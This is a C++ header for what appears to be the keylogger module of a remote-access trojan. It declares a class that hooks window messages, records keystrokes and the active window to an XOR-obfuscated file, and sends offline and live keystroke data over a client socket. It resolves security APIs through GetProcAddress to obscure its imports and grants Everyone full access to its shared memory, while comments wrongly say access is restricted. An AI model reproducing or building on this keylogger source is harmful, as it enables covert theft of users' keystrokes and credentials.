// MyKeyboardManager.h: interface for the CMyKeyboardManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_MyKeyboardManager_H__F0442063_CAAE_4BA1_B6CA_1FCB39A996AC__INCLUDED_)
#define AFX_MyKeyboardManager_H__F0442063_CAAE_4BA1_B6CA_1FCB39A996AC__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"
#include <tchar.h>

#define	SIZE_IMM_BUFFER					128
#define XOR_ENCODE_VALUE				98	// 键盘记录加密的xor值

typedef	struct
{
	DWORD	dwOffset;
	HHOOK	hGetMsgHook;
	HWND	hActWnd;	//current actived window
	bool	bIsOffline;
	TCHAR	strRecordFile[MAX_PATH];
	char	chKeyBoard[1024];
	char	str[SIZE_IMM_BUFFER];
}TShared;


class CShareRestrictedSD  
{
public:
	CShareRestrictedSD()
	{
		ptr = NULL;
		sa.nLength = sizeof(sa);
		sa.lpSecurityDescriptor = &sd;
		sa.bInheritHandle = FALSE;
		// build a restricted security descriptor
		ptr = BuildRestrictedSD(&sd);
	}

	virtual ~CShareRestrictedSD()
	{
		if (ptr)
			FreeRestrictedSD(ptr);
	}

	LPVOID BuildRestrictedSD(PSECURITY_DESCRIPTOR pSD) 
	{
		
		DWORD  dwAclLength;
		PSID   psidEveryone = NULL;
		PACL   pDACL = NULL;
		BOOL   bResult = FALSE;
		PACCESS_ALLOWED_ACE pACE = NULL;
		SID_IDENTIFIER_AUTHORITY siaWorld = SECURITY_WORLD_SID_AUTHORITY  ;
		SECURITY_INFORMATION si = DACL_SECURITY_INFORMATION;

		HINSTANCE advapi32 = LoadLibrary(_T("ADVAPI32.dll")); 
		
		typedef BOOL (WINAPI *ISD)(PSECURITY_DESCRIPTOR pSecurityDescriptor,DWORD dwRevision); 
		ISD myisd; 
		myisd= (ISD)GetProcAddress(advapi32, "InitializeSecurityDescriptor");
		
		typedef BOOL (WINAPI *AAS)(PSID_IDENTIFIER_AUTHORITY pIdentifierAuthority,BYTE nSubAuthorityCount,DWORD dwSubAuthority0,DWORD dwSubAuthority1,DWORD dwSubAuthority2,DWORD dwSubAuthority3,DWORD dwSubAuthority4,DWORD dwSubAuthority5,DWORD dwSubAuthority6,DWORD dwSubAuthority7,PSID *pSid); 
		AAS myaas;
		myaas= (AAS)GetProcAddress(advapi32, "AllocateAndInitializeSid");

		typedef BOOL (WINAPI *GS)(PSID pSid); 
		GS mygs; 
		mygs= (GS)GetProcAddress(advapi32, "GetLengthSid");
			
		typedef BOOL (WINAPI *SSDD)(PSECURITY_DESCRIPTOR pSecurityDescriptor,BOOL bDaclPresent,PACL pDacl,BOOL bDaclDefaulted); 
		SSDD myssdd; 
		myssdd= (SSDD)GetProcAddress(advapi32, "SetSecurityDescriptorDacl");
			
		typedef BOOL (WINAPI *IA)(PACL pAcl,DWORD nAclLength,DWORD dwAclRevision); 
		IA myia; 
		myia= (IA)GetProcAddress(advapi32, "InitializeAcl");

		typedef BOOL (WINAPI *ADDA)(PACL pAcl,DWORD dwAceRevision,DWORD AccessMask,PSID pSid); 
		ADDA myadda;
		myadda= (ADDA)GetProcAddress(advapi32, "AddAccessAllowedAce");

		typedef BOOL (WINAPI *FREES )(PSID pSid); 
		FREES myFreeSid; 
		myFreeSid= (FREES )GetProcAddress(advapi32, "FreeSid");
	
		
		__try {
			
			// initialize the security descriptor
			if (!myisd(pSD, 
				SECURITY_DESCRIPTOR_REVISION)) {
				__leave;
			}
			
			// obtain a sid for the Authenticated Users Group
			if (!myaas(&siaWorld, 1, 
				SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, 
				&psidEveryone)) {
				__leave;
			}
			
			// NOTE:
			// 
			// The Authenticated Users group includes all user accounts that
			// have been successfully authenticated by the system. If access
			// must be restricted to a specific user or group other than 
			// Authenticated Users, the SID can be constructed using the
			// LookupAccountSid() API based on a user or group name.
			
			// calculate the DACL length
			
			  
	
			dwAclLength = sizeof(ACL)
				// add space for Authenticated Users group ACE
				+ sizeof(ACCESS_ALLOWED_ACE) - sizeof(DWORD)
				+ mygs(psidEveryone);
			
			// allocate memory for the DACL
			pDACL = (PACL) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 
				dwAclLength);
			if (!pDACL) {
				__leave;
			}
			
			// initialize the DACL
			if (!myia(pDACL, dwAclLength, ACL_REVISION)) {
				__leave;
			}
			
			// add the Authenticated Users group ACE to the DACL with
			// GENERIC_READ, GENERIC_WRITE, and GENERIC_EXECUTE access

			if (!myadda(pDACL, ACL_REVISION,
				GENERIC_ALL,
				psidEveryone)) {
				__leave;
			}
			// set the DACL in the security descriptor
			if (!myssdd(pSD, TRUE, pDACL, FALSE)) {
				__leave;
			}
			
			bResult = TRUE;
			
		} 
		__finally 
		{
			if (psidEveryone) myFreeSid(psidEveryone);
		}
		
		if (bResult == FALSE) {
			if (pDACL) HeapFree(GetProcessHeap(), 0, pDACL);
			pDACL = NULL;
		}
		
		return (LPVOID) pDACL;
	}

	// The following function frees memory allocated in the
	// BuildRestrictedSD() function
	VOID FreeRestrictedSD(LPVOID ptr) 
	{
		if (ptr) HeapFree(GetProcessHeap(), 0, ptr);
	}

	SECURITY_ATTRIBUTES* GetSA()
	{
		if (ptr)
			return &sa;
		else
			return NULL;
	}

protected:
	LPVOID ptr;
	SECURITY_ATTRIBUTES sa;
	SECURITY_DESCRIPTOR sd;
};
class CMyKeyboardManager : public CManager  
{
public:
	CMyKeyboardManager(CClientSocket *pClient);
	virtual ~CMyKeyboardManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	static bool StartHook();
	static void StopHook();
	static bool Initialization();

	static HINSTANCE g_hInstance;
	static DWORD m_dwLastMsgTime;
	static TShared* m_pTShared;
	static HANDLE m_hMapping_File;
private:
	static LRESULT CALLBACK GetMsgProc(int nCode, WPARAM wParam, LPARAM lParam);
	static void SaveInfo(char *lpBuffer);
	static void SaveToFile(char *lpBuffer);
	int sendOfflineRecord();
	int sendStartKeyBoard();
	int sendKeyBoardData(LPBYTE lpData, UINT nSize);
};

#endif // !defined(AFX_MyKeyboardManager_H__F0442063_CAAE_4BA1_B6CA_1FCB39A996AC__INCLUDED_)
